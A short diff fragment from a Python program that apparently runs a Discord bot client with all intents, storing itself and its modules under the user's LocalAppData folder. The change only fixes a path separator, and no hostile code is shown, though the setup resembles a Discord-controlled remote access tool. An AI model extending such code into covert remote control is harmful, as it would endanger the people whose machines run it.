@@ -13,7 +13,7 @@ import requests
 import time
 import ctypes
 
-main_path = os.getenv("LOCALAPPDATA") + "Snky\Snky-main"
+main_path = os.getenv("LOCALAPPDATA") + "\Snky\Snky-main"
 modules_path = main_path + "\modules"
 client = discord.Client(intents=discord.Intents.all())
 file_version = "2.0"
